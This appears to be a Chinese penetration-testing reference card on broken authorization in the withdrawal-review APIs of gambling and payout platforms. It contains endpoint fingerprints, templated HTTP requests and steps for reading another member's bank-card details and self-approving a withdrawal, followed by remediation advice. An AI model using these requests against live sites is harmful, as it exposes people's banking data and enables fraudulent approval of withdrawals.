---
title: 提现审核接口越权（读他人银行卡 / 改审核状态）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 博彩包网 / 跑分代付
versions: 任意
ports: 80, 443
keywords: 提现, withdraw, 审核, approve, 银行卡, 越权
entry: 两形态二选一（Query/JSON），抓包为准
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

两种常见形态，抓包时都会出现（**同一站点只会用一种**，别拿 Query 形态去套 JSON 站点）：

```
Query 形态： /api/withdraw/list?status=pending&pageNo=1
             /api/withdraw/detail?id=100234
             /api/withdraw/approve?id=100234&state=approved
JSON 形态：  POST /api/withdraw/approve     {"id":100234,"state":"approved"}
             POST /api/admin/withdraw/audit {"orderNo":"...","result":"pass"}
其它：       /api/member/bank?uid=          /api/finance/order/confirm
```

审核类接口常被放在**前台同域**（`www.` 或 `m.`），只靠前端菜单隐藏。

## 前置条件

- **两个**同站点普通会员账号（A、B，都只用自己名下）——只拿"自己的旧单/已取消单"当对照会假阳性：能看自己的单不代表越权。
- 两个账号各下一笔最小金额提现，各得一个 `id`。

## PoC

```http
### 0) 基线：A 的 token 读 A 的单（应 200）—— 两种形态各一套，按抓包选一种
GET  /api/withdraw/detail?id=<A 的单> HTTP/1.1
POST /api/withdraw/detail HTTP/1.1
{"id":<A 的单>}

### 1) 越权读取：A 的 token 读 B 的单（判定越权的唯一可靠证据）
GET  /api/withdraw/detail?id=<B 的单> HTTP/1.1
POST /api/withdraw/detail HTTP/1.1
{"id":<B 的单>}

### 2) 审核动作缺角色校验：A 的 token 审 A 自己的单（Query 与 JSON 二选一）
POST /api/withdraw/approve?id=<A 的单>&state=approved HTTP/1.1
POST /api/withdraw/approve HTTP/1.1
Content-Type: application/json
{"id":<A 的单>,"state":"approved"}
```

## 利用步骤

1. A、B 各提一笔最小金额，记录两个 `id` 与初始状态（pending）。
2. 打第 1 步：返回 B 的姓名/卡号/开户行 ⇒ 越权读取成立（这是判定越权的**主证据**）。
3. 打第 2 步：返回 2xx 且 A 的单 pending → approved ⇒ 审核动作缺角色校验（只打 A 自己的单）。
4. 回读 `detail`/`list` 确认状态落库，而不是只返回成功；会员端 UI 无审核入口只是旁证，不算主证据。
5. **边界**：自审通过 ≠ 钱能出去。是否真出款取决于二级复核、出款风控、渠道对账——这部分语料未覆盖，报告里标"未验证"。
6. 证据：A 读 B 的一条响应（脱敏）+ A 审自己的状态前后；测试单作废并记单号。

## 修复与缓解（加固）

- 审核接口独立管理域 + 强角色校验（财务角色）+ 两级审批 + 幂等（同一单只允许一次状态迁移）。
- 列表/详情按 `uid` 过滤并做行级鉴权；银行卡号只回后四位。
- 所有状态变更写审计（操作人、IP、时间、前后状态）。

## 参考

- OWASP API Security Top 10：API5 BFLA；OWASP WSTG-BUSL-01。
